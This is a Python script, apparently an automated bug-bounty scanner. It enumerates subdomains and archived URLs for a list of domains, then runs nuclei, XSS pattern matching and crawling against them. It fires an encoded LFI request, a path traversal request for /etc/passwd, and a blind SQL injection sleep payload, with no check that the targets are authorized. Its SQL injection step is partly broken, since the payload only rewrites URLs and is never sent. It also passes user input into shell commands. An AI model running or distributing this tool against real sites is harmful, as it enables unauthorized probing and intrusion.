

import subprocess
import os
from datetime import datetime

RESULT_DIR = "scan_results"
SUMMARY_FILE = os.path.join(RESULT_DIR, "report_summary.txt")
SKIP_LARGE_OUTPUT = ["parameters.txt", "wayback.txt", "gau.txt"]

os.makedirs(RESULT_DIR, exist_ok=True)

def print_banner():
    banner = r"""
    ________    _______  ___________         .____    .___ _______  _____________________ 
    \_____  \   \      \ \_   _____/         |    |   |   |\      \ \_   _____/\______   \
    /    |   \  /   |   \ |    __)_   ______ |    |   |   |/   |   \ |    __)_  |       _/
    /    |    \/    |    \|        \ /_____/ |    |___|   /    |    \|        \ |    |   \
    \_______  /\____|__  /_______  /         |_______ \___\____|__  /_______  / |____|_  /
            \/         \/        \/                  \/           \/        \/         \/ 
    """
    print(banner)

def tool_check(tool):
    return subprocess.call(f"which {tool}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

def run_command(command, input_data=None):
    try:
        result = subprocess.run(command, shell=True, input=input_data, timeout=300,
                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        return result.stdout.decode(errors="ignore")
    except subprocess.TimeoutExpired:
        return f"[!] Timeout expired for: {command}\n"
    except Exception as e:
        return f"[-] Error: {e}\n"

def write_output(filename, content):
    full_path = os.path.join(RESULT_DIR, filename)
    with open(full_path, "w") as f:
        f.write(content)

def append_summary(title, content):
    if any(large in title.lower() for large in SKIP_LARGE_OUTPUT):
        return
    with open(SUMMARY_FILE, "a") as f:
        f.write(f"{'='*60}\n[+] {title}\n{'='*60}\n{content[:3000]}\n\n")

def perform_scan(name, command, output_file=None, input_data=None):
    print(f"\n[+] {name} started...")
    result = run_command(command, input_data=input_data)
    if output_file:
        write_output(output_file, result)
    append_summary(output_file or name, result)
    print(f"[+] {name} completed.")
    return result

def main():
    print_banner()
    
    required_tools = ['subfinder', 'waybackurls', 'httpx', 'gau', 'uro', 'gf', 'Gxss', 'nuclei', 'gospider', 'qsreplace', 'katana']
    missing = [tool for tool in required_tools if not tool_check(tool)]
    if missing:
        print(f"\n[!] The following required tools are missing: {', '.join(missing)}")
        return

    domain_file = input("Enter the path to your domain list file (one domain per line): ").strip()
    if not os.path.exists(domain_file):
        print("[-] Domain list file not found.")
        return

    dork_file = input("Enter the path to your dork list file (optional): ").strip()
    dorks = []
    if dork_file and os.path.exists(dork_file):
        with open(dork_file, "r") as f:
            dorks = f.read().splitlines()

    perform_scan("Subdomain Discovery", f"subfinder -dL {domain_file} -silent -o {RESULT_DIR}/domains.txt", "domains.txt")
    
    with open(os.path.join(RESULT_DIR, "domains.txt")) as f:
        subdomains = [line.strip() for line in f if line.strip()]
    
    parameters = set()
    for domain in subdomains:
        wayback = perform_scan(f"Wayback URLs - {domain}", f"waybackurls {domain}", "wayback.txt")
        for line in wayback.splitlines():
            if "?" in line:
                parameters.add(line)

    if dorks:
        parameters.update(dorks)

    write_output("parameters.txt", "\n".join(parameters))

    perform_scan("HTTPX Scan", f"httpx -l {RESULT_DIR}/domains.txt -silent -mc 200", "httpx.txt")
    perform_scan("GAU Extraction", f"gau {' '.join(subdomains)}", "gau.txt")

    katana = perform_scan("Katana Scan", f"katana -jc -l {RESULT_DIR}/httpx.txt -silent")
    uro = perform_scan("URO Deduplication", "uro", input_data=katana.encode())
    gf = perform_scan("GF XSS Pattern Match", "gf xss", input_data=uro.encode())
    perform_scan("Gxss Passive XSS Scanner", "Gxss -p khXSS", "gxss.txt", input_data=gf.encode())

    perform_scan("Nuclei Fuzz Templates", f"nuclei -l {RESULT_DIR}/parameters.txt -t fuzzing-templates", "fuzzing.txt")
    perform_scan("Nuclei Standard Templates", f"nuclei -l {RESULT_DIR}/parameters.txt -t nuclei-templates", "nuclei.txt")

    perform_scan("LFI Test", f"httpx -l {RESULT_DIR}/domains.txt -path '/assets/built%2F..%2F..%2Fpackage.json' -mc 200", "lfi.txt")
    perform_scan("Path Traversal", f"httpx -l {RESULT_DIR}/parameters.txt -path '/../../../etc/passwd' -mc 200 -ms 'root:'", "path_traversal.txt")

    sqli_payload = "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"
    perform_scan("Blind SQL Injection", "qsreplace '1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)'", "blindsqli.txt", input_data="\n".join(parameters).encode())

    perform_scan("Gospider Crawl", f"gospider -S {RESULT_DIR}/httpx.txt -c 5 -d 3 --quiet", "gospider.txt")

    print(f"\n[✓] All scans completed successfully. Summary written to: {SUMMARY_FILE}")

if __name__ == "__main__":
    main()
